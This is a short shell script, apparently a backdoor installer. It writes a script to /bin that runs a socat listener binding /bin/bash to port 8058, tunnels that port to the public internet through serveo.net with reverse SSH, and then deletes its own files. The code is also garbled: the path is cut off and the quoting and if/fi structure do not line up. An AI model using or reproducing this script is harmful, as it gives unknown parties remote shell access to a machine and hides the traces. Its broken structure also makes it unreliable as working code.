chmod +x *
echo "if [[ '$1' == 'stop' ]]; then
pkill socat
pkill ssh
else
socat TCP-LISTEN:8058 EXEC:/bin/bash > /dev/null 2>1 &
ssh -R 18058:localhost:8058 serveo.net > /dev/null 2>1 &" >> /bin>
chmod +x /bin/bk
rm -r *
cd ..
rm -rf .bk
fi
